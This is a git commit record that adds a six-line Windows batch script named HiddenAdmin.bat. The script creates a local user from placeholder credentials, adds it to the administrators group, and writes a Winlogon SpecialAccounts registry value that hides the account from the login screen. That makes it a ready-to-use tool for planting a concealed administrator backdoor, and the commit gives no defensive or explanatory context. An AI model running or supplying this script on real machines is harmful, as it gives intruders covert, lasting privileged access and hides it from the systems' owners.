1f7b8a4baf9001c555b470d762c78a7fc6fb56bd
Cryptotheus <Cryptotheus@gmail.com>
2017-01-03 17:39:52 -1000

    Create HiddenAdmin.bat

---
+++ HiddenAdmin.bat
@@ -0,0 +1,6 @@
+@echo off
+net user **UserName** **Password** /add
+net localgroup administrators **UserName** /add
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v **Username** /t REG_DWORD /d 0
+pause
+exit
